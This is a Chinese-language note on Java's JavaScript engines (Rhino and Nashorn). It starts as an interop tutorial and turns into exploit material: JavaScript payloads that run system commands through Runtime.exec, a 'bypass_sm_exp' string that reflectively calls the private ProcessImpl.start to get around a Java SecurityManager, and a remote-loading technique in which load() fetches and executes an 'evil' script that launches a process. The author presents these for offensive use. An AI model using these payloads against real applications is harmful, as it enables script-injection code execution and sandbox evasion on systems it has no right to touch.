# ScriptEngineManager

Java 6/7采用的js解析引擎是Rhino

java8开始换成了Nashorn。

## 调用Java方法

前面加上全限定类名即可

```js
var s = [3];
s[0] = "cmd";
s[1] = "/c";
s[2] = "whoami";
var p = java.lang.Runtime.getRuntime().exec(s);
var sc = new java.util.Scanner(p.getInputStream(),"GBK").useDelimiter("\\A");//输出
var result = sc.hasNext() ? sc.next() : "";
print(result)
sc.close();
```

## 导入Java类型

```js
var str = java.lang.String;

 //这种写法仅仅支持Nashorn，Rhino并不支持。jdk8+
var str = Java.type("java.lang.String");//类型
-----------------------------------------数组--------------------------------
// Rhino
var Array = java.lang.reflect.Array
var intClass = java.lang.Integer.TYPE
var array = Array.newInstance(intClass, 8)

// Nashorn
var str = Java.type("java.lang.String[]");
var IntArray = Java.type("int[]")
var array = new IntArray(8)
```

## 导入Java class

>通过反射可以获得java类

```js
// Rhino
var str = java.lang.String.class;
var impl = java.lang.ProcessImpl.class;

// Nashorn
var str = Java.type("java.lang.String").class;//类型
var impl = Java.type("java.lang.ProcessImpl").class;
```

## 导入Java类

```js
load("nashorn:mozilla_compat.js");

importClass(java.util.HashSet);
var set = new HashSet();

importPackage(java.util);
var list = new ArrayList();
```

在一些特殊情况下，导入的全局包会影响js中的函数，例如类名冲突。这个时候可以用JavaImporter，并配合with语句，对导入的Java包设定一个使用范围。

```js
// create JavaImporter with specific packages and classes to import

var SwingGui = new JavaImporter(javax.swing,
                            javax.swing.event,
                            javax.swing.border,
                            java.awt.event);
with (SwingGui) {
    // 在with里面才可以调用swing里面的类，防止污染
    var mybutton = new JButton("test");
    var myframe = new JFrame("test");
}
```

## 方法调用

方法在JavaScript中实际上是对象的一个属性，所以除了使用 . 来调用方法之外，也可以使用[]来调用方法：

```js
var System = Java.type('java.lang.System');
System.out.println('Hello, World');    // Hello, World
System.out['println']('Hello, World'); // Hello, World
```

## 方法重载

Java支持重载（Overload）方法，例如，System.out 的 println 有多个重载版本，如果你想指定特定的重载版本，可以使用[]指定参数类型。例如：

```js
var System = Java.type('java.lang.System');
System.out['println'](3.14);          // 3.14
System.out['println(double)'](3.14);  // 3.14
System.out['println(int)'](3.14);     // 3
```

## 反射

```js
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

public class main {
    public static void main(String[] args) throws Exception {
        String poc1 = "var s = [3];\n" +
                "s[0] = \"cmd\";\n" +
                "s[1] = \"/c\";\n" +
                "s[2] = \"whoami\";" +
                "var p = java.lang.Runtime.getRuntime().exec(s);\n" +
                "var sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\");\n" +
                "var result = sc.hasNext() ? sc.next() : \"\";\n" +
                "print(result);sc.close();";

        String bypass_sm_exp = "var str = Java.type('java.lang.String[]').class;" +
                "var map = Java.type('java.util.Map').class;" +
                "var string = Java.type('java.lang.String').class;" +
                "var Redirect = Java.type('java.lang.ProcessBuilder.Redirect[]').class;" +
                "var boolean = Java.type('boolean').class;" +
                "var c = java.lang.Class.forName('java.lang.ProcessImpl');" +
                "var start = c.getDeclaredMethod('start',str,map,string,Redirect,boolean);" +
                "start.setAccessible(true);" +
                "var anArray = [\"cmd\", \"/c\", \"ipconfig\"];" +
                "var cmd = Java.to(anArray, Java.type(\"java.lang.String[]\"));" +
                "var input = start.invoke(null,cmd,null,null,null,false).getInputStream();" +
                "var reader = new java.io.BufferedReader(new java.io.InputStreamReader(input));" +
                "var stringBuilder = new java.lang.StringBuilder();" +
                "var line = null;" +
                "while((line = reader.readLine())!=null){" +
                "stringBuilder.append(line);" +
                "stringBuilder.append('\\r\\n');"+
                "}" +
                "stringBuilder.toString();" +
                "print(stringBuilder)";
        ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");
        engine.eval(bypass_sm_exp);
    }
}
```
2021/12/21 更新

## 远程加载

之前在安全客上介绍了这个利用思路[文章](https://www.anquanke.com/post/id/248771#h3-3)，当时没有利用成功，今天晚上jiang师傅给我说了利用思路。大概是一个load()去远程加载执行。

https://anuradha-15.medium.com/loading-scripts-using-nashorn-85585f495cf0

```java
String url = "http://127.0.0.1:8089/evil" ;
eval("load('"+url+"')");
```
evil
```java
var a=exp();function exp(){var x=new java.lang.ProcessBuilder; x.command("calc"); x.start();};
```

扩展，那这样的话是不是可以减少我们的exp拉。在远程的调用我们的恶意代码可以bypass sm,然后通过load来加载。
